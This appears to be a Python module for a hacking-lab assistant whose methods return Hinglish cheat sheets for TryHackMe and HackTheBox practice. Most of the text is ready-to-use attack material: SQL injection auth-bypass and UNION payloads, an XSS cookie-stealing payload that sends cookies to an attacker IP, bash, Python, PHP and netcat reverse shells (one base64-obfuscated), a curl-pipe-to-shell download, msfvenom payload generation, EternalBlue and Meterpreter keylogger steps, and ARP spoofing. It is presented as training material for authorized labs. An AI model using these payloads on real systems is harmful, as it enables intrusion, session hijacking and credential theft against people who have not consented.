"""
Layra Practical Hacking Lab Assistant
========================================
Practical cybersecurity training for TryHackMe / HackTheBox labs.
⚠️  AUTHORIZED LAB USE ONLY — TryHackMe / HackTheBox / Your own lab machines.
"""

import logging
import subprocess
import os

logger = logging.getLogger("layra.hacklab")


def run_cmd(cmd: str, timeout: int = 60) -> str:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except subprocess.TimeoutExpired:
        return "⏱️ Timed out — command is still running in background"
    except Exception as e:
        return f"Error: {e}"


class HackLabAssistant:
    """
    Practical Hacking Lab Assistant.
    Works with TryHackMe, HackTheBox, and local lab machines.
    """

    # ==========================================
    # 🔐 PASSWORD CRACKING
    # ==========================================

    @staticmethod
    def password_cracking_guide() -> str:
        """Complete password cracking guide with commands."""
        return """
🔐 PASSWORD CRACKING — Practical Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 STEP 1: Hash Type Identify karo
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$ hashid <hash>
$ hash-identifier

Common Hash Types:
  MD5     → 32 chars   e.g: 5f4dcc3b5aa765d61d8327deb882cf99
  SHA1    → 40 chars   e.g: 5baa61e4c9b93f3f0682250b6cf8331b
  SHA256  → 64 chars
  NTLM    → 32 chars (Windows passwords)
  bcrypt  → starts with $2b$

📌 STEP 2: Tools
━━━━━━━━━━━━━━━━━━━━
🔥 HASHCAT (GPU-based, fastest):
  # MD5 dictionary attack
  hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

  # SHA1
  hashcat -m 100 hash.txt rockyou.txt

  # NTLM (Windows)
  hashcat -m 1000 hash.txt rockyou.txt

  # Brute force (4-8 char, all chars)
  hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

🔥 JOHN THE RIPPER:
  john hash.txt --wordlist=rockyou.txt
  john hash.txt --format=raw-md5 --wordlist=rockyou.txt
  john --show hash.txt  ← cracked passwords dekhna

📌 STEP 3: Wordlists
━━━━━━━━━━━━━━━━━━━━━━━
  /usr/share/wordlists/rockyou.txt  ← Best wordlist (14M passwords)
  /usr/share/wordlists/fasttrack.txt
  SecLists (GitHub) ← Must download

📌 STEP 4: Online Hash Cracking
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  • crackstation.net
  • hashes.com
  • md5decrypt.net

🎯 TryHackMe Rooms:
  → tryhackme.com/room/crackthehash
  → tryhackme.com/room/johntheripper0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    @staticmethod
    def crack_hash_online(hash_value: str) -> str:
        """Try to crack a hash using online lookup (CrackStation API)."""
        import urllib.request, urllib.parse, json
        try:
            data = urllib.parse.urlencode({'hash': hash_value, 'key': ''}).encode()
            req = urllib.request.Request(
                'https://crackstation.net/crack.js',
                data=data,
                headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
            )
            result = urllib.request.urlopen(req, timeout=8).read().decode()
            parsed = json.loads(result)
            if parsed and parsed[0].get('result') != 'NOTFOUND':
                password = parsed[0].get('plaintext', 'Not found')
                hash_type = parsed[0].get('type', 'Unknown')
                return f"✅ Hash Cracked!\nHash: {hash_value}\nType: {hash_type}\nPassword: {password}"
            return f"❌ Hash not found in database: {hash_value}\nTry: hashcat or john with rockyou.txt"
        except Exception as e:
            return (
                f"Online lookup failed: {e}\n"
                f"Manual: hashcat -m 0 <hash_file> rockyou.txt\n"
                f"Or check: crackstation.net"
            )

    # ==========================================
    # 💉 SQL INJECTION
    # ==========================================

    @staticmethod
    def sql_injection_guide() -> str:
        """Complete SQL Injection guide."""
        return """
💉 SQL INJECTION — Practical Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 WHAT IS SQL INJECTION?
  Database query mein malicious SQL code inject karna.
  Goal: Data churaana, authentication bypass, DB dump karna.

📌 STEP 1: Test karo — Vulnerable hai?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  URL mein ya input field mein yeh try karo:
  '           ← Single quote (error aaye toh vulnerable)
  ''          ← Double quote
  1 OR 1=1    ← Always true
  1 AND 1=2   ← Always false

📌 STEP 2: Manual SQLi Payloads
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Authentication Bypass:
    admin'--
    admin'#
    ' OR '1'='1
    ' OR 1=1--
    ') OR ('1'='1

  UNION Attack (columns dhundho):
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--

  Data Extract (MySQL):
    ' UNION SELECT username,password FROM users--
    ' UNION SELECT table_name,NULL FROM information_schema.tables--

  Error-based:
    ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

📌 STEP 3: SQLMap (Automated)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Basic scan
  sqlmap -u "http://target.com/page?id=1"

  # POST request
  sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

  # Dump all databases
  sqlmap -u "http://target.com/page?id=1" --dbs

  # Dump tables
  sqlmap -u "http://target.com/page?id=1" -D dbname --tables

  # Dump data
  sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

  # With cookies (logged-in pages)
  sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

  # Bypass WAF
  sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

📌 STEP 4: Defense
━━━━━━━━━━━━━━━━━━━
  ✅ Prepared Statements (Parameterized Queries)
  ✅ Input Validation / Sanitization
  ✅ WAF (Web Application Firewall)
  ✅ Least Privilege DB user

🎯 TryHackMe Rooms:
  → tryhackme.com/room/sqlilab
  → tryhackme.com/room/dvwa (DVWA SQLi)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    # ==========================================
    # 🌐 XSS (CROSS-SITE SCRIPTING)
    # ==========================================

    @staticmethod
    def xss_guide() -> str:
        """Complete XSS attack guide."""
        return """
🌐 XSS (Cross-Site Scripting) — Practical Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 TYPES OF XSS:
  1. Reflected XSS  — URL mein payload, ek baar execute
  2. Stored XSS     — Database mein store, baar baar execute ← Dangerous
  3. DOM-based XSS  — Client-side JavaScript manipulate karna

📌 STEP 1: Test karo
━━━━━━━━━━━━━━━━━━━━━
  Basic test payloads:
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  javascript:alert(1)

📌 STEP 2: Cookie Stealing Payload
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Victim ka cookie apne server pe bhejta hai:
  <script>document.location='http://YOUR_IP/steal?c='+document.cookie</script>

  # IMG tag se (stealthier):
  <img src="http://YOUR_IP/?cookie="+document.cookie>

  # XSS ke liye simple server:
  python3 -m http.server 8080

📌 STEP 3: Bypass Filters
━━━━━━━━━━━━━━━━━━━━━━━━━━━
  <SCRIPT>alert(1)</SCRIPT>           ← Case variation
  <scr<script>ipt>alert(1)</script>   ← Nested
  <img src="x" onerror="&#97;lert(1)"> ← HTML entities
  <script>eval(atob('YWxlcnQoMSk='))</script> ← Base64

📌 STEP 4: BeEF Framework (Advanced)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  BeEF = Browser Exploitation Framework
  XSS ke through browser hook karna:
  <script src="http://YOUR_IP:3000/hook.js"></script>

  Install: sudo apt install beef-xss (Kali Linux)

📌 STEP 5: Defense
━━━━━━━━━━━━━━━━━━━
  ✅ HTML encode all output
  ✅ Content Security Policy (CSP) headers
  ✅ HTTPOnly cookies
  ✅ Input validation

🎯 TryHackMe Rooms:
  → tryhackme.com/room/xss
  → tryhackme.com/room/xssgi
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    # ==========================================
    # 🕵️ NETWORK ANALYSIS
    # ==========================================

    @staticmethod
    def network_analysis_guide() -> str:
        """Network packet analysis guide."""
        return """
🕵️ NETWORK PACKET ANALYSIS — Practical Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 TOOLS:
  • Wireshark — GUI, best for analysis
  • tcpdump  — Command line, fast
  • tshark   — Wireshark CLI version
  • Bettercap — MITM attacks

📌 TCPDUMP Commands
━━━━━━━━━━━━━━━━━━━━━
  # All traffic capture
  sudo tcpdump -i en0

  # Specific port
  sudo tcpdump -i en0 port 80

  # Save to file
  sudo tcpdump -i en0 -w capture.pcap

  # Read pcap file
  tcpdump -r capture.pcap

  # HTTP traffic
  sudo tcpdump -i en0 -A port 80 | grep -i "password\|login\|user"

  # DNS queries
  sudo tcpdump -i en0 port 53

📌 TSHARK Commands
━━━━━━━━━━━━━━━━━━━
  # List interfaces
  tshark -D

  # Capture HTTP
  tshark -i en0 -f "port 80" -Y "http"

  # Extract credentials
  tshark -r capture.pcap -Y "http.request.method==POST"

📌 WIRESHARK Filters
━━━━━━━━━━━━━━━━━━━━━
  http                    ← All HTTP traffic
  http.request.method=="POST"  ← POST requests (forms, login)
  dns                     ← DNS queries
  tcp.port==22            ← SSH traffic
  ip.addr==192.168.1.1    ← Specific IP
  !(arp || dns || icmp)   ← Filter noise

📌 MITM with ARP Spoofing (Lab only!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Enable IP forwarding
  sudo sysctl -w net.inet.ip.forwarding=1

  # ARP Spoof (arpspoof tool)
  sudo arpspoof -i en0 -t VICTIM_IP GATEWAY_IP

  # Capture intercepted traffic
  sudo tcpdump -i en0 host VICTIM_IP

🎯 TryHackMe Rooms:
  → tryhackme.com/room/wireshark101
  → tryhackme.com/room/h4cked (network forensics)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    # ==========================================
    # 💣 METASPLOIT
    # ==========================================

    @staticmethod
    def metasploit_guide() -> str:
        """Metasploit framework practical guide."""
        return """
💣 METASPLOIT FRAMEWORK — Practical Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 BASICS
━━━━━━━━━━━
  msfconsole              ← Start Metasploit
  help                    ← Help menu
  search <keyword>        ← Module search
  use <module>            ← Module select
  info                    ← Module info
  show options            ← Required options dekhna
  set RHOSTS 192.168.1.1  ← Target IP set
  set LHOST 192.168.1.100 ← Your IP (for reverse shell)
  run / exploit           ← Attack launch!

📌 WORKFLOW (Step by Step)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  STEP 1: Nmap se vulnerability dhundho
    nmap -sV -sC 192.168.1.100

  STEP 2: Exploit search karo
    search type:exploit name:eternal
    search cve:2017-0144
    search platform:windows smb

  STEP 3: Module use karo
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.1.100
    set LHOST 192.168.1.50
    run

  STEP 4: Meterpreter (Post-exploitation)
    sysinfo         ← System info
    getuid          ← Current user
    getsystem       ← Privilege escalation
    hashdump        ← Password hashes dump
    shell           ← Command shell
    upload/download ← File transfer
    screenshot      ← Desktop screenshot
    keyscan_start   ← Start keylogger
    run post/multi/recon/local_exploit_suggester

📌 COMMON EXPLOITS (Lab machines)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  EternalBlue (MS17-010):
    exploit/windows/smb/ms17_010_eternalblue
    → Windows 7, Server 2008 pe kaam karta hai

  Web Delivery:
    exploit/multi/script/web_delivery

  Reverse Shell:
    exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp

📌 PAYLOADS
━━━━━━━━━━━━━
  windows/meterpreter/reverse_tcp   ← Windows reverse
  linux/x86/meterpreter/reverse_tcp ← Linux reverse
  php/meterpreter/reverse_tcp       ← PHP web shell

  # Generate payload
  msfvenom -p windows/meterpreter/reverse_tcp \\
    LHOST=YOUR_IP LPORT=4444 -f exe > payload.exe

🎯 TryHackMe Rooms:
  → tryhackme.com/room/rpmetasploit
  → tryhackme.com/room/blue (EternalBlue)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    # ==========================================
    # 🔓 PRIVILEGE ESCALATION
    # ==========================================

    @staticmethod
    def privesc_guide(os_type: str = "linux") -> str:
        """Privilege escalation guide for Linux or Windows."""
        if os_type.lower() == "windows":
            return """
🔓 WINDOWS PRIVILEGE ESCALATION — Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 ENUMERATION (Pehle info gather karo)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  whoami /priv        ← Current privileges
  net user            ← All users
  net localgroup      ← Groups
  systeminfo          ← OS version, patches
  wmic qfe list       ← Installed patches
  netstat -ano        ← Network connections
  tasklist /SVC       ← Running services

📌 AUTOMATED TOOLS
━━━━━━━━━━━━━━━━━━━
  WinPEAS:
    winpeas.exe > output.txt

  PowerUp (PowerShell):
    . .\\PowerUp.ps1
    Invoke-AllChecks

  Sherlock:
    . .\\Sherlock.ps1
    Find-AllVulns

📌 COMMON TECHNIQUES
━━━━━━━━━━━━━━━━━━━━━
  1. Unquoted Service Paths
  2. Weak Service Permissions
  3. DLL Hijacking
  4. Always Install Elevated
  5. Token Impersonation (JuicyPotato)
  6. SeImpersonatePrivilege → SYSTEM

🎯 TryHackMe: tryhackme.com/room/windows10privesc
"""
        else:
            return """
🔓 LINUX PRIVILEGE ESCALATION — Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 ENUMERATION
━━━━━━━━━━━━━━━
  id                      ← Current user & groups
  sudo -l                 ← Sudo permissions ← CHECK THIS FIRST!
  cat /etc/passwd         ← All users
  cat /etc/cron*          ← Cron jobs
  find / -perm -4000 2>/dev/null  ← SUID files ← IMPORTANT!
  find / -writable 2>/dev/null    ← Writable files
  uname -a                ← Kernel version
  ps aux                  ← Running processes

📌 AUTOMATED TOOLS
━━━━━━━━━━━━━━━━━━━
  # LinPEAS (Best tool!)
  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

  # LinEnum
  bash linenum.sh

  # Linux Exploit Suggester
  bash les.sh

📌 COMMON TECHNIQUES
━━━━━━━━━━━━━━━━━━━━━
  1. SUDO Misconfiguration:
     sudo -l → (ALL) NOPASSWD: /usr/bin/vim
     sudo vim -c ':!/bin/bash'   ← ROOT!

  2. SUID Binary:
     find / -perm -4000 2>/dev/null
     ./vulnerable_binary   ← Root shell

  3. Cron Job Exploitation:
     Writable script jo root run karta hai
     echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /script.sh

  4. Kernel Exploit:
     uname -r → search CVE
     gcc exploit.c -o exploit && ./exploit

  5. GTFOBins:
     gtfobins.github.io ← SUID/sudo escape list

🎯 TryHackMe: tryhackme.com/room/linprivesc
"""

    # ==========================================
    # 🐚 REVERSE SHELLS
    # ==========================================

    @staticmethod
    def reverse_shell_guide() -> str:
        """Reverse shell cheatsheet."""
        return """
🐚 REVERSE SHELL — Cheatsheet
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 SETUP: Pehle listener start karo (apne machine pe)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  nc -lvnp 4444          ← Netcat listener
  # Ya Metasploit handler:
  use exploit/multi/handler
  set PAYLOAD linux/x86/shell_reverse_tcp
  set LHOST YOUR_IP
  set LPORT 4444
  run

📌 BASH REVERSE SHELLS
━━━━━━━━━━━━━━━━━━━━━━━
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

  # Encoded version (bypass filters):
  echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBMTkyLjE2OC4xLjEwMC80NDQ0IDA+JjE=" | base64 -d | bash

📌 PYTHON REVERSE SHELLS
━━━━━━━━━━━━━━━━━━━━━━━━━
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

📌 PHP REVERSE SHELL
━━━━━━━━━━━━━━━━━━━━
  php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

📌 NETCAT
━━━━━━━━━
  nc -e /bin/bash ATTACKER_IP 4444

📌 POWERCAT (Windows)
━━━━━━━━━━━━━━━━━━━━━━
  powercat -c ATTACKER_IP -p 4444 -e cmd

📌 SHELL UPGRADE (tty shell)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Basic shell mila, upgrade karo:
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm

🎯 TryHackMe: tryhackme.com/room/introtoshells
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    # ==========================================
    # 🌐 WEB APP TESTING (BURP SUITE)
    # ==========================================

    @staticmethod
    def burpsuite_guide() -> str:
        """Burp Suite web testing guide."""
        return """
🌐 BURP SUITE — Practical Guide
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 SETUP
━━━━━━━━━
  1. Download: portswigger.net/burp (Community = Free)
  2. Browser proxy set: 127.0.0.1:8080
  3. Burp CA certificate install karo (HTTPS ke liye)

📌 KEY FEATURES
━━━━━━━━━━━━━━━━
  🔵 Proxy      → HTTP requests intercept & modify
  🔵 Repeater   → Request baar baar modify karke bhejana
  🔵 Intruder   → Automated attacks (brute force, fuzzing)
  🔵 Scanner    → Auto vulnerability scanning (Pro only)
  🔵 Decoder    → Base64, URL encode/decode
  🔵 Comparer   → 2 responses compare karna

📌 INTERCEPT & MODIFY
━━━━━━━━━━━━━━━━━━━━━━━
  1. Proxy → Intercept → ON
  2. Browser mein request bhejo
  3. Burp mein aayega → Modify karo → Forward

📌 REPEATER (Most Used)
━━━━━━━━━━━━━━━━━━━━━━━━
  Request → Right click → Send to Repeater
  Parameters change karo → Send → Response dekho

📌 INTRUDER (Brute Force)
━━━━━━━━━━━━━━━━━━━━━━━━━━
  1. Request → Send to Intruder
  2. Positions → Attack position mark karo (§password§)
  3. Payloads → Wordlist load karo (rockyou.txt)
  4. Start Attack

📌 COMMON TECHNIQUES
━━━━━━━━━━━━━━━━━━━━━
  • SQLi: parameter mein ' inject karo, error dekho
  • XSS: input mein <script>alert(1)</script>
  • IDOR: ID change karo (user=1 → user=2)
  • Auth Bypass: JWT token modify karo
  • File Upload: .php file upload try karo

📌 EXTENSIONS (BApp Store)
━━━━━━━━━━━━━━━━━━━━━━━━━━━
  • Logger++ → All requests log
  • JWT Editor → JWT token modify
  • AuthMatrix → Authorization testing
  • Param Miner → Hidden parameters dhundhna

🎯 TryHackMe: tryhackme.com/room/burpsuite
🎯 PortSwigger: portswigger.net/web-security (FREE labs!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    # ==========================================
    # 🎯 CTF SOLVING METHODOLOGY
    # ==========================================

    @staticmethod
    def ctf_methodology() -> str:
        """Step-by-step CTF solving approach."""
        return """
🎯 CTF SOLVING METHODOLOGY — Step by Step
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 STEP 1: RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Nmap full scan (har CTF ka pehla step!)
  nmap -sV -sC -p- -T4 TARGET_IP -oN scan.txt

  # Quick scan
  nmap -F TARGET_IP

📌 STEP 2: ENUMERATE SERVICES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Port 80/443 (Web):
    gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
    nikto -h http://TARGET
    curl -I http://TARGET  ← Headers dekho

  Port 21 (FTP):
    ftp TARGET_IP
    User: anonymous / Pass: (blank)  ← Anonymous login try!

  Port 22 (SSH):
    ssh user@TARGET_IP
    hydra -l user -P rockyou.txt TARGET_IP ssh

  Port 139/445 (SMB):
    smbclient -L //TARGET_IP -N
    smbclient //TARGET_IP/share -N
    enum4linux TARGET_IP

  Port 3306 (MySQL):
    mysql -h TARGET_IP -u root -p

📌 STEP 3: WEB ENUMERATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Directory bruteforce
  gobuster dir -u http://TARGET -w common.txt -x php,html,txt

  # Subdomain enumeration
  gobuster dns -d TARGET_DOMAIN -w subdomains.txt

  # Source code dekho (Ctrl+U)
  # robots.txt check karo
  # /.git/ check karo
  # /admin /login /backup

📌 STEP 4: EXPLOITATION
━━━━━━━━━━━━━━━━━━━━━━━━
  • Searchsploit se exploit dhundho:
    searchsploit Apache 2.4.49

  • Metasploit use karo
  • Manual SQLi, XSS try karo
  • Default credentials try karo: admin/admin, admin/password

📌 STEP 5: POST EXPLOITATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Flag dhundho
  find / -name "*.txt" 2>/dev/null | grep flag
  find / -name "user.txt" 2>/dev/null
  find / -name "root.txt" 2>/dev/null
  cat /home/*/user.txt
  cat /root/root.txt

  # Privilege escalation karo
  sudo -l → LinPEAS → SUID → Cron

🏆 CTF Tools Cheatsheet:
  gobuster, nmap, hydra, sqlmap, hashcat
  john, binwalk, steghide, strings, file

🎯 Start here: tryhackme.com/room/startingoutincybersec
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

    @staticmethod
    def tryhackme_rooms() -> str:
        """Best TryHackMe rooms by topic."""
        return """
🏆 TRYHACKME — Best Rooms by Topic
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🟢 BEGINNER (Start Here):
  → Pre-Security Path        (basics)
  → SOC Level 1 Path
  → Jr Penetration Tester Path ← Best for beginners!

🔐 PASSWORD CRACKING:
  → crackthehash             ← Hash cracking
  → johntheripper0           ← John the Ripper

💉 WEB ATTACKS:
  → sqlilab                  ← SQL Injection
  → xss                      ← Cross-Site Scripting
  → burpsuite                ← Burp Suite basics
  → owasptop10               ← OWASP Top 10

🔍 RECON & ENUMERATION:
  → passiverecon             ← Passive recon
  → activerecon              ← Active recon
  → nmap                     ← Nmap mastery

💣 EXPLOITATION:
  → blue                     ← EternalBlue (MS17-010)
  → rpmetasploit             ← Metasploit
  → introtoshells            ← Reverse shells

🔓 PRIVILEGE ESCALATION:
  → linprivesc               ← Linux privesc
  → windows10privesc         ← Windows privesc

🌐 NETWORK:
  → wireshark101             ← Wireshark
  → h4cked                   ← Network forensics

🎯 CTF PRACTICE:
  → picklerick               ← Beginner CTF
  → basicmalwarere           ← Malware analysis
  → corridor                 ← IDOR

URL: tryhackme.com/room/<room_name>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
